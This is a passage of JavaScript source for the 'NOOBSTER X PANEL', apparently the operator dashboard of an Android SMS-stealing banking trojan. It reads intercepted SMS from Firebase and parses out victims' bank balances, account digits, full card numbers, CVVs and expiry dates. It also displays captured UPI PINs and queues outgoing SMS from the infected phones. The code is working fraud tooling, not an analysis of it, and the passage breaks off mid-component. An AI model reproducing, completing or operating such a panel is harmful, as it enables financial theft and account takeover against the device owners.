            searchfile: e(Fragment, null, e("path", { d: "M14 2v4a2 2 0 0 0 2 2h4" }), e("path", { d: "M4.268 21a2 2 0 0 0 1.727 1H18a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3" }), e("path", { d: "m9 18-1.5-1.5" }), e("circle", { cx: 5, cy: 14, r: 3 })),
            alert: e(Fragment, null, e("path", { d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3" }), e("path", { d: "M12 9v4" }), e("path", { d: "M12 17h.01" })),
            eye: e(Fragment, null, e("path", { d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" }), e("circle", { cx: 12, cy: 12, r: 3 })),
            eyeoff: e(Fragment, null, e("path", { d: "M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" }), e("path", { d: "M14.084 14.158a3 3 0 0 1-4.242-4.242" }), e("path", { d: "M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" }), e("path", { d: "m2 2 20 20" })),
            trendup: e(Fragment, null, e("path", { d: "M16 7h6v6" }), e("path", { d: "m22 7-8.5 8.5-5-5L2 17" })),
            trenddown: e(Fragment, null, e("path", { d: "M16 17h6v-6" }), e("path", { d: "m22 17-8.5-8.5-5 5L2 7" })),
            chevron: e("path", { d: "m9 18 6-6-6-6" }),
            dots: e(Fragment, null, e("circle", { cx: 12, cy: 12, r: 1 }), e("circle", { cx: 12, cy: 5, r: 1 }), e("circle", { cx: 12, cy: 19, r: 1 })),
            star: e("path", { d: "M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z" })
        };
        return e("svg", { width: size, height: size, viewBox: "0 0 24 24", fill: name === "star" ? "currentColor" : "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round", className, style }, paths[name] || null);
    };

    // ---- Toast system ----
    function Toast({ msg, type, onClose }) {
        useEffect(() => { const t = setTimeout(onClose, 3000); return () => clearTimeout(t); }, [onClose]);
        return e("div", { className: "fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-2xl text-sm font-semibold shadow-xl animate-fade-up", style: { background: "#1a1a1a", border: "1px solid " + (type === "error" ? "rgba(239,68,68,0.4)" : type === "success" ? "rgba(34,197,94,0.4)" : "#333"), color: type === "error" ? "#f87171" : type === "success" ? "#4ade80" : "#fff", maxWidth: "90vw" } }, msg);
    }

    // ---- SMS / Bank analysis ----
    const BANK_PATTERNS = [
        [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"], [/SBIIN|SBIINB|SBI/i, "SBI"], [/ICICIB|ICICI/i, "ICICI Bank"],
        [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"], [/KOTAKB|KOTAK/i, "Kotak Bank"], [/PNBSMS|PNB/i, "PNB"],
        [/BOIIND|BOI/i, "Bank of India"], [/CANBNK|CANARA/i, "Canara Bank"], [/UNIONB|UBISMS/i, "Union Bank"],
        [/YESBNK|YESBANK/i, "Yes Bank"], [/IDBIBK|IDBI/i, "IDBI Bank"], [/INDUSB|INDUSIND/i, "IndusInd Bank"],
        [/FEDERAL|FEDBNK/i, "Federal Bank"], [/RBLBNK|RBL/i, "RBL Bank"], [/PAYTM/i, "Paytm"],
        [/PHONEPE|PHNPE/i, "PhonePe"], [/GPAY|GOOGLEPAY/i, "Google Pay"], [/AMAZONPAY/i, "Amazon Pay"],
        [/CRED/i, "CRED"], [/AIRTEL/i, "Airtel Payments"], [/JIOMNY|JIOMONEY/i, "Jio Money"]
    ];
    function detectBank(sender) {
        for (const [re, name] of BANK_PATTERNS) if (re.test(sender)) return name;
        const m = (sender || "").toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
        return m ? m[1] : (sender || "Bank");
    }
    const BAL_PATTERNS = [
        /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
        /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
        /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
        /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
        /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
    ];
    const TXN_PATTERNS = [
        /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
        /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i
    ];
    const ACCT_PATTERNS = [
        /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
        /[xX*]{4,}([0-9]{4})/i, /ending\s+(?:with\s+)?([0-9]{4})/i
    ];
    const CARD_PATTERNS = [/card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i, /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i];
    const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
    const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
    const PHONE_PATTERNS = [
        /(?:Jio|JIO)\s+(?:Number|No\.?|Num)[\s:\-]+([6-9][0-9]{9})/,
        /(?:Airtel|AIRTEL)\s+(?:Number|No\.?)[\s:\-]+([6-9][0-9]{9})/,
        /(?:BSNL|bsnl)\s+(?:Number|No\.?)[\s:\-]+([6-9][0-9]{9})/,
        /(?:mobile|phone|contact)\s+(?:no\.?|number|num)[\s:\-]+([6-9][0-9]{9})/i,
        /(\+91[\-\s]?[6-9][0-9]{9})/,
        /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/
    ];
    function detectBankSMS(text, sender) {
        if (!text || text.trim().length < 8) return null;
        const hasKeyword = /AVL|AVAL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|A\/C|ACCOUNT|INR|RUPEE/i.test(text);
        const isBankSender = BANK_PATTERNS.some(([re]) => re.test(sender));
        if (!hasKeyword && !isBankSender) return null;
        let balance = null;
        for (const re of BAL_PATTERNS) { const m = text.match(re); if (m && m[1]) { balance = m[1].replace(/,/g, ""); break; } }
        if (!balance) return null;
        let amount = null;
        for (const re of TXN_PATTERNS) { const m = text.match(re); if (m && m[1] && m[1].replace(/,/g, "") !== balance) { amount = m[1].replace(/,/g, ""); break; } }
        let type = null;
        if (/credit(?:ed)?/i.test(text)) type = "credit";
        else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) type = "debit";
        let last4 = null;
        for (const re of ACCT_PATTERNS) { const m = text.match(re); if (m && m[1]) { last4 = m[1].replace(/[^0-9]/g, "").slice(-4); break; } }
        let phone = null;
        for (const re of PHONE_PATTERNS) { const m = text.match(re); if (m) { let d = m[1].replace(/[^0-9]/g, ""); if (d.length === 12 && d.startsWith("91")) d = d.slice(2); if (d.length === 10 && /^[6-9]/.test(d)) { phone = d; break; } } }
        return {
            bankName: detectBank(sender), senderName: sender || "Unknown",
            availableBalance: balance, transactionAmount: amount, transactionType: type,
            accountLast4: last4, phoneFromSms: phone, rawSms: text, detectedAt: new Date().toISOString()
        };
    }
    function detectCard(text) {
        if (!text) return null;
        const up = text.toUpperCase();
        if (!/CARD|CVV|CREDIT|DEBIT/.test(up)) return null;
        let last4 = null;
        for (const re of CARD_PATTERNS) { const m = text.match(re); if (m && m[1]) { const d = m[1].replace(/[^0-9]/g, ""); if (d.length >= 4) { last4 = d.slice(-4); break; } } }
        if (!last4) return null;
        let cardType = "";
        if (/VISA/i.test(text)) cardType = "VISA";
        else if (/MASTER(?:CARD)?/i.test(text)) cardType = "Mastercard";
        else if (/RUPAY/i.test(text)) cardType = "RuPay";
        else if (/AMEX|AMERICAN EXPRESS/i.test(text)) cardType = "Amex";
        else if (/credit/i.test(text)) cardType = "Credit Card";
        else if (/debit/i.test(text)) cardType = "Debit Card";
        let cvv = "", expiry = "";
        for (const re of CVV_PATTERNS) { const m = text.match(re); if (m && m[1]) { cvv = m[1]; break; } }
        for (const re of EXP_PATTERNS) { const m = text.match(re); if (m && m[1]) { expiry = m[1]; break; } }
        return { cardLast4: last4, cardType, cvv: cvv || undefined, expiry: expiry || undefined, rawSms: text };
    }
    function analyzeSMS(messages) {
        const bankBalances = [], cards = [], phoneNumbers = new Set(), networks = new Set();
        messages.forEach(m => {
            const b = detectBankSMS(m.text, m.sender);
            if (b) { b.detectedAt = m.time || b.detectedAt; bankBalances.push(b); }
            const c = detectCard(m.text);
            if (c) cards.push(c);
        });
        return { bankBalances, cards, phoneNumbers: [...phoneNumbers], networks: [...networks] };
    }

    // ---- Share links ----
    function makeShareLink(url, key) {
        const base = window.location.origin + window.location.pathname;
        const b = btoa(unescape(encodeURIComponent(url + "|||" + key)));
        return base + "?s=" + b;
    }
    function decodeShare(s) {
        try {
            const txt = decodeURIComponent(escape(atob(s)));
            const [url, key] = txt.split("|||");
            if (url && key) return { url, key };
        } catch {}
        return null;
    }

    // ---- Components ----
    function LoginScreen({ onConnect, onConnectAll }) {
        const [accounts, setAccounts] = useState(() => LS.get(ACCOUNTS_KEY, []));
        const [showForm, setShowForm] = useState(false);
        const [url, setUrl] = useState("");
        const [key, setKey] = useState("");
        const [err, setErr] = useState("");
        const [busy, setBusy] = useState(false);
        const [shareLink, setShareLink] = useState("");
        const [copied, setCopied] = useState(false);

        useEffect(() => {
            const s = new URLSearchParams(window.location.search).get("s");
            if (s) {
                const d = decodeShare(s);
                if (d) {
                    window.history.replaceState({}, "", window.location.pathname);
                    autoConnect(d.url, d.key);
                }
            }
        }, []);

        const autoConnect = async (u, k) => {
            setBusy(true); setErr("");
            try {
                await fbFetch(u, k, "clients");
                onConnect(u, k);
            } catch (e) { setErr("Shared link failed: " + e.message); }
            finally { setBusy(false); }
        };

        const saveAccs = (list) => { setAccounts(list); LS.set(ACCOUNTS_KEY, list); };

        const connectSaved = async (acc) => {
            setBusy(true); setErr("");
            try { await fbFetch(acc.url, acc.key, "clients"); onConnect(acc.url, acc.key); }
            catch (e) { setErr("Connection failed: " + e.message); }
            finally { setBusy(false); }
        };

        const submit = async () => {
            if (!url.trim() || !key.trim()) { setErr("Enter URL and Key"); return; }
            setBusy(true); setErr("");
            try {
                await fbFetch(url, key, "clients");
                const acc = { id: Date.now(), url: url.trim(), key: key.trim(), date: new Date().toLocaleString() };
                const list = [...accounts, acc];
                saveAccs(list);
                onConnect(url.trim(), key.trim());
            } catch (e) { setErr(e.message); }
            finally { setBusy(false); }
        };

        const delAcc = (id, ev) => {
            ev.stopPropagation();
            if (confirm("Delete this account?")) saveAccs(accounts.filter(a => a.id !== id));
        };

        const shareAcc = (acc, ev) => { ev.stopPropagation(); setShareLink(makeShareLink(acc.url, acc.key)); setCopied(false); };
        const copyLink = () => { navigator.clipboard.writeText(shareLink); setCopied(true); setTimeout(() => setCopied(false), 2000); };

        return e("div", { className: "min-h-screen flex items-center justify-center relative overflow-hidden", style: { background: "radial-gradient(ellipse at 60% 0%, rgba(120,20,20,0.5) 0%, transparent 60%), radial-gradient(ellipse at 0% 100%, #0a0f18 0%, #050810 100%)" } },
            e("div", { className: "absolute top-0 right-1/4 w-96 h-96 rounded-full blur-3xl", style: { background: "radial-gradient(circle, #ef4444, transparent)", opacity: 0.1 } }),
            e("div", { className: "absolute bottom-0 left-1/4 w-80 h-80 rounded-full blur-3xl", style: { background: "radial-gradient(circle, #f97316, transparent)", opacity: 0.08 } }),
            e("div", { className: "relative z-10 w-full max-w-md px-4 py-8" },
                e("div", { className: "text-center mb-8" },
                    e("div", { className: "inline-flex items-center justify-center w-16 h-16 rounded-2xl mb-4 red-gradient shadow-lg", style: { boxShadow: "0 10px 15px -3px rgba(127,29,29,0.5)" } },
                        e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })
                    ),
                    e("div", { className: "flex flex-col items-center justify-center mt-10" },
                        e("h1", { className: "relative text-4xl font-bold italic tracking-tight animate-fade-in" },
                            e("span", { style: { color: "#6acfff" } }, "NOOBSTER X "),
                            e("span", null, "PANEL"),
                            e("span", { className: "relative" }, e("span", { className: "absolute top-0 right-0 w-2 h-2 rounded-full animate-glint", style: { background: "#6acfff" } }))
                        ),
                        e("p", { className: "text-sm mt-2 animate-fade-in", style: { color: "#666", animationDelay: "300ms" } }, "Device Management Console")
                    )
                ),
                e("div", { className: "glass-card rounded-3xl p-7 shadow-2xl" },
                    !showForm && e(Fragment, null,
                        e("div", { className: "flex items-center justify-between mb-4" },
                            e("div", { className: "flex items-center gap-2" },
                                e(Icon, { name: "wifi", size: 16, className: "text-[#666]" }),
                                e("span", { className: "text-sm font-semibold" }, "Saved Accounts")
                            ),
                            e("span", { className: "text-xs px-2 py-1 rounded-full", style: { background: "#222", color: "#666" } }, accounts.length + " account" + (accounts.length === 1 ? "" : "s"))
                        ),
                        accounts.length > 0 && e("button", {
                            onClick: () => !busy && onConnectAll && onConnectAll(accounts),
                            className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm mb-3",
                            style: { background: "linear-gradient(90deg, #2563eb, #7c3aed)", color: "#fff", boxShadow: "0 10px 15px -3px rgba(49,46,129,0.4)" }
                        }, e(Icon, { name: "wifi", size: 16 }), " Connect All (" + accounts.length + ")"),
                        e("div", { className: "space-y-2 mb-4", style: { maxHeight: "13rem", overflowY: "auto", paddingRight: "4px" } },
                            accounts.length === 0
                                ? e("div", { className: "text-center py-8", style: { color: "#555" } },
                                    e(Icon, { name: "wifi", size: 32, className: "mx-auto mb-2 opacity-30" }),
                                    e("p", { className: "text-sm" }, "No saved accounts"))
                                : accounts.map(acc => e("div", { key: acc.id, onClick: () => !busy && connectSaved(acc), className: "flex items-center gap-3 p-3 rounded-xl cursor-pointer transition-all", style: { border: "1px solid #1a1a1a" } },
                                    e("div", { className: "flex-1 min-w-0" },
                                        e("p", { className: "text-sm font-semibold truncate" }, acc.url),
                                        e("p", { className: "text-xs mt-1 font-mono truncate", style: { color: "#555" } }, acc.date + " · " + acc.key.substring(0, 20) + "…")
                                    ),
                                    e("button", { onClick: ev => shareAcc(acc, ev), className: "p-1.5 rounded-lg", style: { background: "rgba(23,37,84,0.6)", border: "1px solid rgba(30,64,175,0.4)", color: "#60a5fa" } }, e(Icon, { name: "share", size: 12 })),
                                    e("button", { onClick: ev => delAcc(acc.id, ev), className: "p-1.5 rounded-lg", style: { background: "rgba(69,10,10,0.6)", border: "1px solid rgba(127,29,29,0.4)", color: "#f87171" } }, e(Icon, { name: "trash", size: 12 }))
                                ))
                        ),
                        e("button", {
                            onClick: () => { setShowForm(true); setErr(""); },
                            className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl border-dashed text-sm font-medium",
                            style: { border: "1px dashed #333", color: "#666", background: "transparent" }
                        }, e(Icon, { name: "plus", size: 16 }), " New Account")
                    ),
                    showForm && e("div", { className: "animate-fade-up" },
                        e("div", { className: "flex items-center gap-2 mb-5" },
                            e("button", { onClick: () => { setShowForm(false); setErr(""); setUrl(""); setKey(""); }, className: "p-1.5 rounded-lg", style: { background: "#1a1a1a" } }, e(Icon, { name: "chevron", size: 16, className: "rotate-180" })),
                            e("h3", { className: "font-semibold" }, "New Firebase Account")
                        ),
                        e("div", { className: "space-y-4" },
                            e("div", null,
                                e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#666" } }, "Firebase URL"),
                                e("input", { type: "text", value: url, onChange: ev => setUrl(ev.target.value), placeholder: "https://your-project.firebaseio.com", className: "w-full px-4 py-3 rounded-xl outline-none text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } })
                            ),
                            e("div", null,
                                e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#666" } }, "Auth Key / Secret"),
                                e("input", { type: "text", value: key, onChange: ev => setKey(ev.target.value), placeholder: "Your Firebase secret key", className: "w-full px-4 py-3 rounded-xl outline-none text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } })
                            )
                        ),
                        e("div", { className: "flex gap-3 mt-6" },
                            e("button", { onClick: submit, disabled: busy, className: "flex-1 py-3 rounded-xl font-semibold text-sm red-gradient text-white disabled:opacity-50" },
                                busy ? "Connecting…" : "Save & Connect"),
                            e("button", { onClick: () => { setShowForm(false); setErr(""); setUrl(""); setKey(""); }, className: "px-5 py-3 rounded-xl text-sm font-medium", style: { background: "#222", color: "#888" } }, "Cancel")
                        )
                    ),
                    err && e("p", { className: "mt-4 text-center text-sm text-red-400 animate-fade-up" }, err)
                ),
                e("p", { className: "text-center text-xs mt-6", style: { color: "#333" } }, "NOOBSTER X Panel Console · All connections are logged"),
                shareLink && e("div", { className: "fixed inset-0 z-50 flex items-center justify-center px-4", style: { background: "rgba(0,0,0,0.75)", backdropFilter: "blur(6px)" }, onClick: () => setShareLink("") },
                    e("div", { className: "w-full max-w-md glass-card rounded-2xl p-6 shadow-2xl", onClick: ev => ev.stopPropagation() },
                        e("div", { className: "flex items-center justify-between mb-5" },
                            e("h3", { className: "font-semibold text-sm" }, "Share Connection"),
                            e("button", { onClick: () => setShareLink(""), className: "p-1.5 rounded-lg", style: { color: "#888" } }, e(Icon, { name: "x", size: 16 }))
                        ),
                        e("div", { className: "flex items-center gap-2 p-3 rounded-xl mb-4", style: { background: "#111", border: "1px solid #222" } },
                            e("span", { className: "text-xs font-mono flex-1 truncate", style: { color: "#888" } }, shareLink),
                            e("button", { onClick: copyLink, className: "px-3 py-1.5 rounded-lg text-xs font-semibold", style: { background: copied ? "rgba(6,78,59,0.5)" : "rgba(23,37,84,0.6)", color: copied ? "#4ade80" : "#60a5fa" } }, copied ? "Copied!" : "Copy")
                        ),
                        e("p", { className: "text-xs", style: { color: "#fbbf24" } }, "⚠️ This link contains your credentials. Share only with trusted people.")
                    )
                )
            )
        );
    }

    function BatteryBar({ percent }) {
        const color = percent >= 60 ? "#4ade80" : percent >= 30 ? "#facc15" : "#ef4444";
        return e("div", { className: "flex items-center gap-1.5" },
            e("div", { className: "flex items-center" },
                e("div", { className: "relative flex items-center rounded-[3px]", style: { width: 26, height: 12, padding: 2, border: "1px solid #555" } },
                    e("div", { className: "rounded-[1.5px] h-full transition-all duration-500", style: { width: Math.max(5, percent) + "%", background: color } })
                ),
                e("div", { style: { width: 3, height: 5, background: "#555", borderRadius: "0 2px 2px 0", marginLeft: -1 } })
            ),
            e("span", { className: "text-xs font-semibold tabular-nums", style: { color } }, percent + "%")
        );
    }

    function DeviceCard({ dev, starred, onToggleStar, onClick }) {
        const analysis = dev.smsAnalysis || { bankBalances: [], cards: [], phoneNumbers: [], networks: [] };
        const topBank = analysis.bankBalances[0];
        const hasCard = analysis.cards.length > 0;
        const hasBank = analysis.bankBalances.length > 0;
        return e("div", {
            onClick,
            className: "group relative border rounded-2xl p-3 sm:p-4 cursor-pointer transition-all duration-200",
            style: {
                background: "#000",
                borderColor: starred ? "rgba(245,158,11,0.5)" : "#1f1f1f",
            }
        },
            e("div", { className: "flex items-start gap-2 sm:gap-3 mb-2.5" },
                e("div", { className: "w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center flex-shrink-0", style: { background: dev.status ? "rgba(34,197,94,0.15)" : "#1a1a1a", border: "1px solid " + (dev.status ? "rgba(34,197,94,0.25)" : "#262626") } },
                    e(Icon, { name: "wifi", size: 20, className: dev.status ? "text-emerald-400" : "text-[#444]" })
                ),
                e("div", { className: "flex-1 min-w-0" },
                    e("h3", { className: "text-xs sm:text-sm font-bold text-white truncate" }, dev.name),
                    e("p", { className: "text-[9px] font-mono mt-0.5 truncate", style: { color: "#555" } }, dev.id)
                ),
                e("div", { className: "flex items-center gap-1 flex-shrink-0" },
                    e("button", {
                        onClick: ev => { ev.stopPropagation(); onToggleStar && onToggleStar(dev.id); },
                        className: "p-1 rounded-lg transition-all",
                        style: { background: starred ? "rgba(245,158,11,0.2)" : "transparent", color: starred ? "#fbbf24" : "#444", border: starred ? "1px solid rgba(245,158,11,0.4)" : "none" }
                    }, e(Icon, { name: "star", size: 14 })),
                    dev.upipin && e(Icon, { name: "zap", size: 14, className: "text-amber-400" }),
                    hasBank && e(Icon, { name: "rupee", size: 14, className: "text-emerald-400" }),
                    hasCard && e(Icon, { name: "card", size: 14, className: "text-purple-400" })
                )
            ),
            e("div", { className: "grid grid-cols-2 gap-3 mb-3" },
                e("div", null,
                    e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Android"),
                    e("p", { className: "text-sm font-bold", style: { color: "#ccc" } }, dev.android !== "—" ? "v" + dev.android.replace("v", "") : "—")
                ),
                e("div", null,
                    e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Battery"),
                    e(BatteryBar, { percent: dev.batteryPercent })
                )
            ),
            e("div", { className: "grid grid-cols-2 gap-3 mb-3" },
                e("div", null,
                    e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Number"),
                    e("p", { className: "text-xs font-mono truncate", style: { color: "#aaa" } }, dev.phoneNumber)
                ),
                dev.provider !== "—" && e("div", null,
                    e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Network"),
                    e("p", { className: "text-xs font-semibold truncate", style: { color: "#aaa" } }, dev.provider)
                )
            ),
            topBank && e("div", { className: "mb-3 px-3 py-2 rounded-xl", style: { background: "rgba(2,44,34,0.2)", border: "1px solid rgba(6,78,59,0.2)" } },
                e("div", { className: "flex items-center justify-between" },
                    e("div", { className: "flex items-center gap-1.5" },
                        e(Icon, { name: "rupee", size: 14, className: "text-emerald-400" }),
                        e("span", { className: "text-[10px] font-semibold text-emerald-400" }, topBank.bankName),
                        topBank.accountLast4 && e("span", { className: "text-[9px] font-mono", style: { color: "#444" } }, "••" + topBank.accountLast4)
                    ),
                    e("span", { className: "text-sm font-black text-white" }, "₹" + formatCurrency(topBank.availableBalance))
                )
            ),
            hasCard && e("div", { className: "mb-3 px-3 py-1.5 rounded-xl flex items-center gap-2", style: { background: "rgba(59,7,100,0.2)", border: "1px solid rgba(88,28,135,0.2)" } },
                e(Icon, { name: "card", size: 14, className: "text-purple-400" }),
                e("span", { className: "text-[10px] font-semibold text-purple-400" }, "Card ••" + analysis.cards[0].cardLast4),
                analysis.cards[0].cardType && e("span", { className: "text-[10px]", style: { color: "#555" } }, analysis.cards[0].cardType)
            ),
            e("div", { className: "flex items-center gap-2 flex-wrap" },
                e("span", { className: "w-2 h-2 rounded-full flex-shrink-0", style: { background: dev.status ? "#22c55e" : "#333", boxShadow: dev.status ? "0 0 6px #22c55e" : "none" } }),
                dev.status ? e("span", { className: "text-xs font-semibold text-emerald-400" }, "Online")
                : e("div", { className: "flex items-center gap-1.5 min-w-0" },
                    e("span", { className: "text-xs", style: { color: "#555" } }, "Offline"),
                    dev.lastSeen && e("span", { className: "text-[10px] font-mono px-1.5 py-0.5 rounded", style: { color: "#444", background: "#111", border: "1px solid #1e1e1e" } }, timeAgo(dev.lastSeen))
                ),
                dev.upipin && e("span", { className: "ml-auto px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(245,158,11,0.1)", border: "1px solid rgba(245,158,11,0.2)", color: "#fbbf24" } }, "UPI PIN")
            )
        );
    }

    function DeviceDetail({ dev, fbUrl, fbKey, onClose, onDelete, showToast }) {
        const [messages, setMessages] = useState([]);
        const [analysis, setAnalysis] = useState({ bankBalances: [], cards: [], phoneNumbers: [], networks: [] });
        const [loading, setLoading] = useState(true);
        const [tab, setTab] = useState("info");
        const [sendTo, setSendTo] = useState("");
        const [sendMsg, setSendMsg] = useState("");
        const [sending, setSending] = useState(false);
        const [sendSim, setSendSim] = useState(1);

        const loadMessages = useCallback(async () => {
            try {
                const data = await fbFetch(fbUrl, fbKey, "messages/" + dev.id, { orderBy: '"$key"', limitToLast: "150" });
                const parsed = parseMessages(data);
                setMessages(parsed);
                setAnalysis(analyzeSMS(parsed));
            } catch { setMessages([]); }
            finally { setLoading(false); }
        }, [dev.id, fbUrl, fbKey]);

        useEffect(() => {
            loadMessages();
            const iv = setInterval(loadMessages, 6000);
            return () => clearInterval(iv);
        }, [loadMessages]);

        const send = async () => {
            if (!sendTo || !sendMsg) { showToast("Fill number and message", "error"); return; }
            setSending(true);
            try {
                await fbPut(fbUrl, fbKey, "clients/" + dev.id + "/webhookEvent/sendSms", {
                    from: sendSim, to: sendTo, message: sendMsg, isSended: false
                });
                showToast("SMS queued!", "success");
                setSendMsg("");
            } catch (e) { showToast(e.message.includes("PERMISSION") ? "Firebase permission denied" : "Send failed", "error"); }
            finally { setSending(false); }
        };

        const del = async () => {
            if (!confirm("Delete " + dev.name + "?")) return;
            try { await fbDelete(fbUrl, fbKey, "clients/" + dev.id); showToast("Device deleted", "success"); onDelete(); }
            catch { showToast("Delete failed", "error"); }
        };

        const tabs = [
            { k: "info", l: "Info" },
            { k: "bank", l: "Bank (" + analysis.bankBalances.length + ")" },
            ...(analysis.cards.length > 0 ? [{ k: "card", l: "Card (" + analysis.cards.length + ")" }] : []),
            { k: "sms", l: "SMS (" + messages.length + ")" },
            { k: "send", l: "Send" }
        ];

        return e("div", { className: "fixed inset-0 z-50 flex", onClick: onClose },
            e("div", { className: "absolute inset-0 bg-black/70 backdrop-blur-sm" }),
            e("div", { className: "relative ml-auto w-full max-w-md h-full flex flex-col", style: { background: "#0d0d0d", borderLeft: "1px solid #1f1f1f" }, onClick: ev => ev.stopPropagation() },
                e("div", { className: "flex items-center justify-between px-5 py-4 border-b", style: { borderColor: "#1a1a1a" } },
                    e("div", { className: "flex items-center gap-3" },
                        e("div", { className: "w-9 h-9 rounded-xl flex items-center justify-center", style: { background: dev.status ? "rgba(34,197,94,0.15)" : "#1a1a1a", border: "1px solid " + (dev.status ? "rgba(34,197,94,0.25)" : "#262626") } },
                            e(Icon, { name: "wifi", size: 16, className: dev.status ? "text-emerald-400" : "text-[#444]" })
                        ),
                        e("div", null,
                            e("h3", { className: "text-sm font-bold text-white" }, dev.name),
                            e("p", { className: "text-[10px] font-mono mt-0.5", style: { color: "#555" } }, dev.id)
                        )
                    ),
                    e("div", { className: "flex items-center gap-2" },
                        e("button", { onClick: del, className: "p-2 rounded-xl", style: { background: "rgba(69,10,10,0.4)", border: "1px solid rgba(127,29,29,0.3)", color: "#f87171" } }, e(Icon, { name: "trash", size: 16 })),
                        e("button", { onClick: onClose, className: "p-2 rounded-xl", style: { background: "#1a1a1a", border: "1px solid #262626", color: "#888" } }, e(Icon, { name: "x", size: 16 }))
                    )
                ),
                e("div", { className: "flex items-center gap-3 px-5 py-2.5 flex-wrap border-b", style: { background: "#0a0a0a", borderColor: "#1a1a1a" } },
                    e("div", { className: "flex items-center gap-1.5" },
                        e("span", { className: "w-2 h-2 rounded-full", style: { background: dev.status ? "#22c55e" : "#333", boxShadow: dev.status ? "0 0 6px #22c55e" : "none" } }),
                        e("span", { className: "text-xs font-semibold", style: { color: dev.status ? "#4ade80" : "#555" } }, dev.status ? "Online" : "Offline")
                    ),
                    e("div", { className: "flex items-center gap-1" },
                        e("span", { className: "text-[10px]", style: { color: "#555" } }, "Bat"),
                        e("span", { className: "text-[10px] font-bold", style: { color: dev.batteryPercent >= 60 ? "#4ade80" : dev.batteryPercent >= 30 ? "#facc15" : "#f87171" } }, dev.battery)
                    ),
                    dev.upipin && e("span", { className: "px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(245,158,11,0.1)", border: "1px solid rgba(245,158,11,0.2)", color: "#fbbf24" } }, "UPI: " + dev.upipin.split("|")[0]),
                    analysis.bankBalances.length > 0 && e("span", { className: "px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(34,197,94,0.1)", border: "1px solid rgba(34,197,94,0.2)", color: "#4ade80" } }, analysis.bankBalances.length + " Bank"),
                    analysis.cards.length > 0 && e("span", { className: "px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(168,85,247,0.1)", border: "1px solid rgba(168,85,247,0.2)", color: "#c084fc" } }, analysis.cards.length + " Card")
                ),
                e("div", { className: "flex border-b overflow-x-auto", style: { borderColor: "#1a1a1a", padding: "0 8px" } },
                    tabs.map(t => e("button", { key: t.k, onClick: () => setTab(t.k), className: "px-3 py-3 text-[11px] font-semibold border-b-2 whitespace-nowrap", style: { borderColor: tab === t.k ? "#ef4444" : "transparent", color: tab === t.k ? "#f87171" : "#555" } }, t.l))
                ),
                e("div", { className: "flex-1 overflow-y-auto" },
                    tab === "info" && e("div", { className: "px-5 py-4" },
                        e(InfoRow, { label: "Phone", value: dev.phoneNumber, mono: true }),
                        e(InfoRow, { label: "Network", value: dev.provider }),
                        e(InfoRow, { label: "Android", value: dev.android }),
                        e(InfoRow, { label: "IP", value: dev.ip, mono: true }),
